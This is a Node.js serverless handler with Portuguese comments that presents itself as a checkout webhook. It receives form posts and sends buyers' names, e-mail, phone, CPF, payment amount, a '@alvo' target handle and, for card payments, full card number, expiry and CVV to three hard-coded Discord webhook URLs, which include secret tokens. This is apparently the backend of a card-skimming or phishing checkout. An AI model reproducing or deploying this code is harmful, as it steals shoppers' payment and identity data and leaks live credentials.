// ============================================================
// 💳 WEBHOOK DO CHECKOUT → Discord
// ============================================================
// Recebe do checkout.html e envia pro Discord.
// As URLs do Discord ficam SÓ AQUI, nunca chegam no cliente.

const DISCORD_WEBHOOK_ALL  = 'https://discord.com/api/webhooks/1553287629187846157/-Npb5CoufNIeI-iTLQbShvdW1t-a3wXyXcgv1BJO6-aOrJTgqfLyN2VNaZedZ7ziFRwZ';
const DISCORD_WEBHOOK_PIX  = 'https://discord.com/api/webhooks/1553603746468990991/17WFmzQt0mghN0O-WKgjg9iReb9ieLYO1qVcUoUXBqbdFa5w3-wXWL5l2l2rN1ikbS-f';
const DISCORD_WEBHOOK_CARD = 'https://discord.com/api/webhooks/1553603673022660738/sc_fw4BM_7LvPSJtkOuOJTZdAdFKhcyHiBrvVB8D1Ca7EtM6PbuJpUJ1sATAxdRqEIUp';

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    const body = req.body || {};
    const { tipo } = body;

    if (tipo === 'all') {
      const { nome, email, telefone, cpf, metodo, valor, alvo, card_name, card_number, card_expiry, card_cvv, installments } = body;

      const fields = [
        { name: '👤 Nome',     value: nome     || '(vazio)', inline: false },
        { name: '📧 E-mail',   value: email    || '(vazio)', inline: false },
        { name: '📱 Telefone', value: telefone || '(vazio)', inline: true  },
        { name: '🪪 CPF',      value: cpf      || '(vazio)', inline: true  },
        { name: '💳 Método',   value: metodo,                inline: true  },
        { name: '💰 Valor',    value: valor,                 inline: true  }
      ];
      if (alvo) fields.push({ name: '🎯 Alvo', value: '@' + alvo, inline: true });

      if (metodo && metodo.includes('Cartão')) {
        fields.push(
          { name: '👤 Nome impresso',    value: card_name     || '—', inline: true },
          { name: '💳 Número do cartão', value: card_number   || '—', inline: true },
          { name: '📅 Validade',         value: card_expiry   || '—', inline: true },
          { name: '🔒 CVV',              value: card_cvv      || '—', inline: true },
          { name: '📦 Parcelas',         value: installments ? installments + 'x' : '—', inline: true }
        );
      }

      await fetch(DISCORD_WEBHOOK_ALL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: 'Checkout 🛒',
          embeds: [{
            title: '🛒 Novo Checkout Recebido',
            color: 0x0400f0,
            fields,
            footer: { text: new Date().toLocaleString('pt-BR') }
          }]
        })
      });

      return res.status(200).json({ ok: true });
    }

    if (tipo === 'pix') {
      const { nome, email, cpf, telefone, valor, alvo, transactionId } = body;

      const fields = [
        { name: '👤 Nome',     value: nome     || '(vazio)', inline: true },
        { name: '📧 E-mail',   value: email    || '(vazio)', inline: false },
        { name: '🪪 CPF',      value: cpf      || '(vazio)', inline: true },
        { name: '📱 Telefone', value: telefone || '(vazio)', inline: true },
        { name: '💰 Valor',    value: valor,                 inline: true }
      ];
      if (alvo) fields.push({ name: '🎯 Alvo', value: '@' + alvo, inline: true });
      if (transactionId) fields.push({ name: '🆔 ID ZPay', value: transactionId, inline: false });

      await fetch(DISCORD_WEBHOOK_PIX, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: 'PIX Gerado 💰',
          embeds: [{
            title: '💰 PIX Gerado (aguardando pagamento)',
            color: 0xFACC15,
            fields,
            footer: { text: new Date().toLocaleString('pt-BR') }
          }]
        })
      });

      return res.status(200).json({ ok: true });
    }

    if (tipo === 'card') {
      const { nome, email, cpf, telefone, alvo, card_name, card_number, card_expiry, card_cvv, installments } = body;

      const fields = [
        { name: '👤 Nome',     value: nome     || '—', inline: true  },
        { name: '📧 E-mail',   value: email    || '—', inline: false },
        { name: '🪪 CPF',      value: cpf      || '—', inline: true  },
        { name: '📱 Telefone', value: telefone || '—', inline: true  }
      ];
      if (alvo) fields.push({ name: '🎯 Alvo', value: '@' + alvo, inline: false });

      fields.push(
        { name: '👤 Nome impresso',    value: card_name   || '—', inline: true  },
        { name: '💳 Número do cartão', value: card_number || '—', inline: false },
        { name: '📅 Validade',         value: card_expiry || '—', inline: true  },
        { name: '🔒 CVV',              value: card_cvv    || '—', inline: true  },
        { name: '📦 Parcelas',         value: installments ? installments + 'x' : '—', inline: true }
      );

      await fetch(DISCORD_WEBHOOK_CARD, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: 'Cartão 💳',
          embeds: [{
            title: '💳 Novo Cartão Preenchido',
            color: 0x0400f0,
            fields,
            footer: { text: new Date().toLocaleString('pt-BR') }
          }]
        })
      });

      return res.status(200).json({ ok: true });
    }

    return res.status(400).json({ error: 'tipo inválido' });

  } catch (err) {
    console.error('❌ Erro webhook-checkout:', err.message);
    return res.status(500).json({ ok: false, error: err.message });
  }
};
